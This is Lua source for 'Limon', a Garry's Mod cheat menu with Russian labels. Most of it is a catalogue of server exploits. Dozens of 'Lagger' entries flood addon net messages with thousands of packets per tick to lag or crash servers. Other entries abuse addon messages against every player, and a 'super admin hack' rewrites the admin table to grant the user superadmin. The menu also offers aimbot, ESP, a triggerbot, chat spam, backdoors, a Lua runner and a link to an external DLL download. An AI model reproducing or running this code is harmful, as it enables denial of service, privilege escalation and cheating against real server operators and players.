status = ValidNetString("ZED_SpawnCar")
if (status) then
ECPrint("Found Exploit: ZED Spawn Car [ZED_SpawnCar]")
addExploit( "254","ZED Spawn Car", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ZED_SpawnCar")
net.WriteFloat(1)
net.SendToServer()
end )
end

status = ValidNetString("DeployMask") -- 37.230.228.248:27016
if (status) then
ECPrint("Found Exploit: To wear a gas mask at all players [DeployMask]")
addExploit( "255","To wear a gas mask", "Exploit puts gas masks on all players, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("DeployMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("RemoveMask") -- 37.230.228.248:27016
if (status) then
ECPrint("Found Exploit: Remove the gas mask from all players [RemoveMask]")
addExploit( "256","Remove the gas mask", "The exploit takes off gas masks from all players, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("RemoveMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("SwapFilter") -- 37.230.228.248:27016
if (status) then
ECPrint("Found Exploit: Change all filters of a gas mask [SwapFilter]")
addExploit( "257","Change all filters", "Exploit changes the filter for all gas masks, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("SwapFilter")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("WipeMask") -- 37.230.228.248:27016
if (status) then
ECPrint("Found Exploit: Wipe gas masks [WipeMask]")
addExploit( "258","Wipe gas masks", "Exploit wipes all gas masks, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("WipeMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("UseMedkit") -- 37.230.228.248:27016
if (status) then
ECPrint("Found Exploit: Use Medkit [UseMedkit]")
addExploit( "259","Use Medkit", "Exploit uses a first aid kit on all players, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("UseMedkit")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("IDInv_RequestBank")
if (status) then
ECPrint("Found Exploit: Lagger #23 [IDInv_RequestBank]")
addExploit( "260","Lagger #23", "an exploit in the addon 'IDinventory', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if !timer.Exists("lagger23") then
timer.Create("lagger23", 0, 0, function()
for i = 1, 1000 do
net.Start("IDInv_RequestBank",true)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("casinokit_chipexchange")
if (status) then
ECPrint("Found Exploit: Lagger #24 [casinokit_chipexchange]")
addExploit( "261","Lagger #24", "an exploit in the addon 'CasinoKit', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if !timer.Exists("lagger24") then
timer.Create("lagger24", 0, 0, function()
for i = 1, 1000 do
net.Start("casinokit_chipexchange",true)
net.WriteEntity(LocalPlayer())
net.WriteString("darkrp")
net.WriteBool(false)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999,32)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("RemoveTag")
if (status) then
ECPrint("Found Exploit: 1tap server [RemoveTag]")
addExploit( "262","1tap server", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("1tap", 0.5, 0, function()
for i=1, 4000 do
net.Start("RemoveTag")
net.WriteFloat(9999999999999999999999999999999999999999999999999999999999)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("desktopPrinter_Withdraw")
if (status) then
ECPrint("Found Exploit: Lagger #25 [desktopPrinter_Withdraw]")
addExploit( "263","Lagger #25", "an exploit in the addon 'Desktop Printers', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if !timer.Exists("lagger25") then
timer.Create("lagger25", 0, 0, function()
for i = 1, 1000 do
net.Start("desktopPrinter_Withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("sphys_dupe")
if (status) then
ECPrint("Found Exploit: Lagger #26 [sphys_dupe]")
addExploit( "264","Lagger #26", "an exploit in the addon 'Simfphys', discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger26", 0.2, 0, function()
for i=1,2200 do
net.Start("sphys_dupe",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("simfphys_gasspill")
if (status) then
ECPrint("Found Exploit: Poop on players [simfphys_gasspill]")
addExploit( "265","Poop on players", "an exploit in the addon 'Simfphys', discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("poop", 0.1, 0, function()
for k,v in pairs(player.GetAll()) do
for j=1,3 do
if IsValid(v) then
net.Start("simfphys_gasspill")
net.WriteVector(v:GetPos()+Vector(0,0,90))
net.WriteVector(v:EyePos())
net.SendToServer()
end
end
end
end )
end )
end

status = ValidNetString("dronesrewrite_controldr")
if (status) then
ECPrint("Found Exploit: Lagger #27 [dronesrewrite_controldr]")
addExploit( "266","Lagger #27", "discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger27", 0.2, 0, function()
for i=1,2200 do
net.Start("dronesrewrite_controldr",true)
net.SendToServer()
end
end )
end )
end


status = ValidNetString("SCP-294Sv")
if (status) then
ECPrint("Found Exploit: SCP-294 Exploit [SCP-294Sv]")
addExploit( "267","SCP-294 Exploit", "discovered by questionmark", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do 
net.Start("SCP-294Sv")
net.WriteString("acid")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("VC_PlayerReady")
if (status) then
ECPrint("Found Exploit: Lagger #28 [VC_PlayerReady]")
addExploit( "268","Lagger #28", "an exploit in the addon 'VCMod', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger28", 0, 0, function()
for i = 1, 1000 do
net.Start("VC_PlayerReady",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("phone")
if (status) then
ECPrint("Found Exploit: Call all players [phone]")
addExploit( "269","Call all players", "discovered by questionmark", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do
net.Start("phone")
net.WriteTable{
ply=v,
act='call'
}
net.SendToServer()
end
end )
end

status = ValidNetString("blueatm")
if (status) then
ECPrint("Found Exploit: Lagger #29 [blueatm]")
addExploit( "270","Lagger #29", "an exploit in the addon 'Blue ATM', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger29", 0, 0, function()
for i = 1, 1000 do
net.Start("blueatm",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("cab_cd_testdrive")
if (status) then
ECPrint("Found Exploit: Stavox Teleport [cab_cd_testdrive]")
addExploit( "271","Stavox Teleport", "discovered by Aromatic", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start('cab_cd_testdrive')
net.WriteUInt(0, 3)
net.WriteUInt(5, 8)
net.SendToServer()
end )
end

status = ValidNetString("cab_sendmessage")
if (status) then
ECPrint("Found Exploit: Stavox Message [cab_sendmessage]")
addExploit( "272","Stavox Message", "discovered by Aromatic", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do
net.Start("cab_sendmessage")
net.WriteEntity(v)
net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
net.SendToServer()
end
end )
end

status = ValidNetString("disguise")
if (status) then
ECPrint("Found Exploit: Lagger #30 [disguise]")
addExploit( "273","Lagger #30", "discovered by Aromatic & Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger30", 0, 0, function()
for i = 1, 1000 do
net.Start("disguise",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("FARMINGMOD_DROPITEM")
if (status) then
ECPrint("Found Exploit: Lagger #31 [FARMINGMOD_DROPITEM]")
addExploit( "274","Lagger #31", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger31", 0, 0, function()
for i = 1, 1000 do
net.Start("FARMINGMOD_DROPITEM",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 16)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SlotsRemoved")
if (status) then
ECPrint("Found Exploit: Lagger #32 [SlotsRemoved]")
addExploit( "275","Lagger #32", "an exploit in the addon 'PointShop 2 Perma Weapons', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger32", 0, 0, function()
for i = 1, 1000 do
net.Start("SlotsRemoved",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("AirDrops_StartPlacement")
if (status) then
ECPrint("Found Exploit: Lagger #33 [AirDrops_StartPlacement]")
addExploit( "276","Lagger #33", "an exploit in the addon 'PointShop 2 AirDrops', discovered by Dembi", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger33", 0, 0, function()
for i = 1, 1000 do
net.Start("AirDrops_StartPlacement",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("pp_info_send")
if (status) then
ECPrint("Found Exploit: Lagger #34 [pp_info_send]")
addExploit( "277","Lagger #34", "an exploit in the addon 'Perma Props',discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger33", 0, 0, function()
for i = 1, 1000 do
net.Start("pp_info_send",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("IGS.GetPaymentURL")
if (status) then
ECPrint("Found Exploit: Lagger #35 [IGS.GetPaymentURL]")
addExploit( "278","Lagger #35", "an exploit in the 'IGS', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger35", 0, 0, function()
for i = 1, 1000 do
net.Start("IGS.GetPaymentURL",true)
net.WriteDouble(9999999999999999999999999999999999999999999999999999999999)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("fg_printer_money")
if (status) then
ECPrint("Found Exploit: Lagger #36 [fg_printer_money]")
addExploit( "279","Lagger #36", "an exploit in the 'FG Printers', discovered by Aromatic", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger36", 0, 0, function()
for i = 1, 1000 do
net.Start('fg_printer_money',true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("tickbookpayfine")
if (status) then
ECPrint("Found Exploit: Lagger #37 [tickbookpayfine]")
addExploit( "280","Lagger #37", "an exploit in the 'Ticket Book', discovered by Aromatic", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger37", 0, 0, function()
for i = 1, 1000 do
net.Start("tickbookpayfine",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("BeginSpin")
if (status) then
ECPrint("Found Exploit: Lagger #38 [BeginSpin]")
addExploit( "281","Lagger #38", "an exploit in the 'Blue Unbox 2', discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger38", 0, 0, function()
for i = 1, 1000 do
net.Start("BeginSpin",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("DuelRequestClient")
if (status) then
ECPrint("Found Exploit: Lagger #39 [DuelRequestClient]")
addExploit( "282","Lagger #39", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger39", 0, 0, function()
for i = 1, 1000 do
net.Start("DuelRequestClient",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("ncpstoredoact")
if (status) then
ECPrint("Found Exploit: Lagger #40 [ncpstoredoact]")
addExploit( "283","Lagger #40", "an exploit in the addon 'NPC Store',discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger40", 0, 0, function()
for i = 1, 1000 do
net.Start("ncpstoredoact",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("PermwepsNPCSellWeapon")
if (status) then
ECPrint("Found Exploit: Lagger #41 [PermwepsNPCSellWeapon]")
addExploit( "284","Lagger #41", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger41", 0, 0, function()
for i = 1, 2000 do
net.Start("PermwepsNPCSellWeapon",true)
net.WriteString("")
net.SendToServer()
end
end )
end )
end

status = ValidNetString("bitcoins_request_withdraw")
if (status) then
ECPrint("Found Exploit: Lagger #42 [bitcoins_request_withdraw]")
addExploit( "285","Lagger #42", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
timer.Create("lagger42", 0, 0, function()
for i = 1, 2000 do
net.Start("bitcoins_request_withdraw",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("bitcoins_request_turn_on")
if (status) then
ECPrint("Found Exploit: To include all bitcoin miners [bitcoins_request_turn_on]")
addExploit( "286","To include all bitcoin miners", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("bitcoins_request_turn_on")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("bitcoins_request_turn_off")
if (status) then
ECPrint("Found Exploit: Disable all bitcoin miners [bitcoins_request_turn_off]")
addExploit( "287","Disable all bitcoin miners", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("bitcoins_request_turn_off")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("NET_AM_MakePotion")
if (status) then
ECPrint("Found Exploit: Lagger #43 [NET_AM_MakePotion]")
addExploit( "288","Lagger #43", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger43", 0, 0, function()
for i = 1, 2000 do
net.Start('NET_AM_MakePotion',true)
net.WriteEntity(LocalPlayer())
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("minigun_drones_switch")
if (status) then
ECPrint("Found Exploit: Lagger #44 [minigun_drones_switch]")
addExploit( "289","Lagger #44", "discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger44", 0.2, 0, function()
for i=1,2200 do
net.Start("minigun_drones_switch",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("CW20_PRESET_LOAD")
if (status) then
ECPrint("Found Exploit: Lagger #45 (u need cw2 weapon in hand) [CW20_PRESET_LOAD]")
addExploit( "290","Lagger #45", "(u need cw2 weapon in hand),discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger45", 0.2, 0, function()
if(LocalPlayer():GetActiveWeapon():GetClass():find("cw"))then
for i=1,2200 do
net.Start("CW20_PRESET_LOAD",true)
net.SendToServer()
end
end
end )
end )
end

status = ValidNetString("SBP_addtime")
if (status) then
ECPrint("Found Exploit: Lagger #46 [SBP_addtime]")
addExploit( "291","Lagger #46", "discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger46", 0.3, 0, function()
for i=1,2200 do
net.Start("SBP_addtime",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("properties")
if (status) then
addExploit( "333","remove_weapons", "", function()
	local players=player.GetAll()
	local k=0
	timer.Create("remove_weapons",0.1,0,function()
		local ply=players[k]
		if ply and ply:IsValid() then
			for x,weapon in pairs(v:GetWeapons()) do
				net_Start("properties")
				net.WriteString("remove",32)
				net.WriteEntity(weapon)
				net.SendToServer()
			end
		end
	end)
end)
end







status = ValidNetString("pplay_addrow")
if (status) then
addExploit( "333","super admin hack", "", function()
    local id = LocalPlayer():SteamID()

    local tbl = {}

    tbl.name = "FAdmin_PlayerGroup"

    tbl.where = {

    "steamid",

    tostring(id)

    }

    net.Start("pplay_deleterow")

    net.WriteTable(tbl)

    net.SendToServer()

    local tbl = {}

    tbl.tblname = "FAdmin_PlayerGroup"

    tbl.tblinfo = {

    tostring(id),

    "superadmin"

    }

    net.Start("pplay_addrow")

    net.WriteTable(tbl)

    net.SendToServer()
end)
end




status = ValidNetString("NetData")
if (status) then
ECPrint("Found Exploit: Outfit player nouser [NetData]")
addExploit( "292","Outfit player nouser", "Just noise players near u (discovered by Solly)", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do
net.Start("NetData")
net.WriteString("OF")
net.WriteUInt(4,8)
net.WriteData(math.random(100000,9999999)..",sis.mdl",30)
net.SendToServer()
end
end )
end
--inputFrame

---------------------------------------------------------------------------------------
end)


--[[
hook.Add( "entity_killed", "ace_propkilldetector", function( data )

    local inflictor_index = data.entindex_inflictor

    local attacker_index = data.entindex_attacker

    local damagebits = data.damagebits

    local victim_index = data.entindex_killed



    local ply = "nobody?"

    local retard = game.GetWorld()

    local atk = "the map"

    local wep = "unknown weapon"

    local killah = game.GetWorld()

    local inflictor = ents.GetByIndex(inflictor_index)



    for _, p in pairs(player.GetAll()) do

        if p:EntIndex() == victim_index then ply = p:Nick() retard = p end

        if p:EntIndex() == attacker_index then 

            atk = p:Nick()

            killah = p

            if p:GetActiveWeapon() and p:GetActiveWeapon():IsValid() then wep = p:GetActiveWeapon():GetPrintName() end

        end

    end



    if AB.Vars.DeathTaunts and retard == LocalPlayer() then LocalPlayer():ConCommand( "ace_chatspam_once" ) end

    if AB.Vars.NewLifeRule and retard == LocalPlayer() then LocalPlayer():ConCommand( "ace_random_rpname" ) end



    if attacker_index == victim_index then AB.DebugLog( ply.." сам себя убил", Color(180,150,150) ) if AB.Vars.NotifyKills then AB.ChatText( ply.." necked himself", Color(255,155,105) ) end return end

    if inflictor:IsValid() and inflictor:GetClass() == "prop_physics" then 

        AB.DebugLog( ply.." got crushed by a prop!", Color(180,150,150) )

        if AB.Vars.NotifyKills then AB.ChatText( ply.." got crushed by a prop!", Color(255,155,105) ) end

        return 

    end



    AB.DebugLog( atk.." убил "..ply.." из "..wep, Color(200,150,150) )

    if AB.Vars.NotifyKills then AB.ChatText( atk.." убил "..ply.." из "..wep, Color(255,155,105) ) end



    if AB.Vars.KillTaunts and retard != LocalPlayer() and killah == LocalPlayer() then LocalPlayer():ConCommand( "say "..AB.GenerateInsult4() ) end

/*

    local ply = "nobody"

    local prop = "nothing"



    for k, v in pairs(ents.GetAll()) do

        if v:EntIndex() == victim_index then ply = v end

        if (v:GetClass() == "prop_physics" or string.find(v:GetClass(), "gmod_") or string.find(v:GetClass(), "wire_") ) and v:EntIndex() == attacker_index then prop = v end

    end



    if !FPP then return end



    if ply == "nobody" or prop == "nothing" then return end

    if !FPP.entGetOwner( prop ):IsValid() then return end



    AB.DebugLog( FPP.entGetOwner( prop ):Nick().." propkilled "..ply:Nick().." with a "..prop:GetClass().." ("..prop:GetModel()..")", Color(150,150,55) )

    */



end )



gameevent.Listen( "player_connect" )

hook.Add( "player_connect", "ace_playerconnected", function( data )

    AB.DebugLog( data.name .. " ( ".. data.networkid.." ) has connected to the server.", Color(150,150,150) )

end )



gameevent.Listen( "player_hurt" )

hook.Add( "player_hurt", "crosshair_readinjuries", function( data )

    if data.attacker == LocalPlayer():UserID() then AB.CrossHairAlpha = 255 end

end )



gameevent.Listen( "player_disconnect" )

hook.Add( "player_disconnect", "ace_playerleave", function( data )

    timer.Simple( 0.5, function() AB.RemoveInvalidFriends() end )

    AB.DebugLog( data.name .. " ( ".. data.networkid.." ) has disconnected from the server. ( ".. data.reason .." )", Color(150,150,150) )

end )
--]]


concommand.Add( "L_menu", function()
	local Limon = vgui.Create( "DFrame" )
	Limon:SetPos( 100,  100)
	Limon:SetSize( 250, 347 )
	Limon:Center()
	Limon:SetTitle( "" )
	Limon:SetVisible( true )
	Limon:SetDraggable( true )
	Limon:ShowCloseButton( false )
	Limon:MakePopup()
	Limon.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon:GetWide(), Limon:GetTall() )
	surface.SetDrawColor( 255,255,5, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon:GetWide(), Limon:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Color(255,255,5) )
	draw.SimpleText("Limon "..limon_v.." ["..Limon_sesia.." Сек]", 'Limon_15', 5, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon )
	Limon_b:SetText( "" )
	Limon_b:SetPos(227, 1)
	Limon_b:SetSize( 22, 20 )	
	Limon_b.DoClick = function()
    Limon:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end

local pnl = Limon:Add( "PanelList" )
pnl:Dock( FILL )
pnl:EnableVerticalScrollbar()
pnl.Paint = function( self )
end



function addLimon(id, text, desc, func)
local id = pnl:Add( "DButton" )
id:SetText("")
pnl:AddItem( id )
if desc then 
id:SetToolTip( desc ) 
end
id:Dock( BOTTOM )
id:DockMargin( -5, 10, 1, -5 )
id:DockPadding( 2, 22, 2, 22 )
id.Paint = function(pnl, w, h)
draw.RoundedBox(0, 0, 0, w, h, Color(0,0,0))
draw.SimpleText(text, "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
if id.Hovered then
draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
end
end
id.DoClick = func
end

addLimon( "0"," ", " ", function()
end)

addLimon( "1","Автобанихоп", "Прыгать как зайчик", function()
RunConsoleCommand("L_bhop")
end)

addLimon( "1","lua error", "Ерорить как сучка", function()
RunConsoleCommand("L_luaerror_tog")
end)

addLimon( "1","block net receive", "Ерорить будет все,но анти чит сасать)", function()
block_net_limon()
end)

addLimon( "2","Информация об объекте", "Посмотреть корды и тд объекта", function()
RunConsoleCommand("L_prop")
end)

addLimon( "3","Список админов", "Все админы онлайн", function()
RunConsoleCommand("L_admin_list")
end)

addLimon( "4","Очистить чат", "Очищяет чат)", function()
Limon_clearchat()
end)

addLimon( "5","Замутить всех", "Мутит всех на сервере", function()
RunConsoleCommand("L_mute_all_tog")
end)

addLimon( "6","Esp 1", "Показывает ники всех игроков", function()
RunConsoleCommand("L_veil_nics_tog")
end)

addLimon( "7","Клиент полет", "Летать как прица[shift - медленно][ctrl - супермедленно]", function()
RunConsoleCommand("L_noclip")
Limon:Close()
end)

--for i = 1,100 do
addLimon( "9","Спам", "Спамить в чат", function()
RunConsoleCommand("L_spam_tog")
end)
--end

addLimon( "10","Фейк хак", "Фейк хак суперадминки типо вы хакер", function()
RunConsoleCommand("L_hack")
end)

addLimon( "11","Цвета", "Цвета короче игроки белые,админы красные,а вы лимон,если не понятно L_color_info в консоль", function()
RunConsoleCommand("L_color")
end)

addLimon( "12","Аим бот 2", "Помошник в прицеливании", function()
RunConsoleCommand("L_aimbot_2_tog")
end)

addLimon( "13","Esp 2", "Видно тела игроков", function()
RunConsoleCommand("L_esp")
end)

addLimon( "14","Els", "Над игроками моча", function()
Limonels()
end)

addLimon( "15","Trigerbot", "Нажимает лкм когда вы наводитесь на игрока", function()
RunConsoleCommand("L_trigerbot_tog")
end)

addLimon( "16","Прозрачные стены", "Стены видны,кобуто у вас нет кс контента) это не выключить!", function()
RunConsoleCommand("L_steni")
end)

addLimon( "17","Els prop", "Вх на пропы энтити и тд", function()
RunConsoleCommand("L_prop_viel_tog")
end)

addLimon( "18","Прицел", "Покашто простой прицел", function()
RunConsoleCommand("L_pricel_tog")
end)

addLimon( "19","Анти антиафк", "Анти афк сасет", function()
RunConsoleCommand("L_antiafk_tog")
end)

addLimon( "20","Фейк деньги", "Только для даркрп", function()
RunConsoleCommand("L_mony")
end)

addLimon( "20","Fps fix", "Уменьшает качество текстур и тд", function()
RunConsoleCommand("L_fpsfix")
end)

addLimon( "24","Аим бот(на F)", "на f наводится на ближащего игрока", function()
RunConsoleCommand("L_aimbot_tog")
end)

addLimon( "21","all net receive", "Читает нет смс", function()
Limon_nethack()
Limon:Close()
end)

addLimon( "27","Вид от 3-лица", "гг", function()
if Limon_1 then
Limon_1 = !Limon_1
Notify("Включен вид" )
on = true
else
Limon_1 = !Limon_1 
Notify("Включен вид" )
on = false
end
end)


addLimon( "22","Client side", "клиент", function()
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "если ерорит скачайте gmcl_stringtablesex_win32.dll, установите в GarrysMod/garrysmod/lua/bin,перезагрузите игру чтобы использовать клиент сайд Скачать:https://anonfile.com/Efr538i6b5/gmcl_stringtablesex_win32_dll")
RunConsoleCommand("lua_view")
Limon:Close()
end)


addLimon( "22","Lua run", "запуск кода на клиент", function()
RunConsoleCommand("L_luarun")
Limon:Close()
end)

addLimon( "22","Экспилойты", "Экспилойты)", function()
RunConsoleCommand("L_exploits")
Limon:Close()
end)


addLimon( "23","Бекдуры", "Бекдуры)", function()
RunConsoleCommand("L_backdoor")
Limon:Close()
end)


addLimon( "26","Limon чат", "Чат пользователей чита)", function()
RunConsoleCommand("L_chat")
end)


addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

addLimon( "0"," ", " ", function()
end)

end)

function executer() 		
local PANEL = {}  	
PANEL.URL = "http://metastruct.github.io/lua_editor/" 	
PANEL.COMPILE = "C"  	
local javascript_escape_replacements = 	{ 		
["\\"] = "\\\\", 		
["\0"] = "\\0" , 		
["\b"] = "\\b" , 		
["\t"] = "\\t" , 		
["\n"] = "\\n" , 		
["\v"] = "\\v" , 		
["\f"] = "\\f" , 		
["\r"] = "\\r" , 		
["\""] = "\\\"", 		
["\'"] = "\\\'", 	
}  	

function PANEL:Init() 		
self.Code = ""  		
self.ErrorPanel = self:Add("DButton") 		
self.ErrorPanel:SetFont('BudgetLabel') 		
self.ErrorPanel:SetTextColor(Color(255,255,255)) 		
self.ErrorPanel:SetText("") 		
self.ErrorPanel:SetTall(0) 		
self.ErrorPanel.DoClick = function() 			
self:GotoErrorLine() 		end 		
self.ErrorPanel.DoRightClick = function(self) 			
SetClipboardText(self:GetText()) 		
end 		
self.ErrorPanel.Paint = function(self,w,h) 			
surface.SetDrawColor(255,50,50) 			
surface.DrawRect(0,0,w,h) 		end  		
self:StartHTML() 	end  	
function PANEL:Think() 		
if self.NextValidate && self.NextValidate < CurTime() then 			
self:ValidateCode() 		
end 	
end  	
function PANEL:StartHTML() 		
self.HTML = self:Add("DHTML")  		
self:AddJavascriptCallback("OnCode") 		
self:AddJavascriptCallback("OnLog")  		
self.HTML:OpenURL(self.URL) 		 		
self.HTML:RequestFocus() 	
end  	
function PANEL:ReloadHTML() 		
self.HTML:OpenURL(self.URL) 	
end  	
function PANEL:JavascriptSafe(str) 		
str = str:gsub(".",javascript_escape_replacements) 		
str = str:gsub("\226\128\168","\\\226\128\168") 		
str = str:gsub("\226\128\169","\\\226\128\169") 		
return str 	end  	
function PANEL:CallJS(JS) 		
self.HTML:Call(JS) 	
end  	
function PANEL:AddJavascriptCallback(name) 		
local func = self[name]  		
self.HTML:AddFunction("gmodinterface",name,function(...) 			
func(self,HTML,...) 		
end) 	
end  	
function PANEL:OnCode(_,code) 		
self.NextValidate = CurTime() + 0.2 		
self.Code = code 	
end  	
function PANEL:OnLog(_,...) 		
print(...) 	
end  	function PANEL:SetCode(code) 		
self.Code = code 		
self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");') 	
end  	
function PANEL:GetCode() 		
return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
end  	function PANEL:SetGutterError(errline,errstr) 		
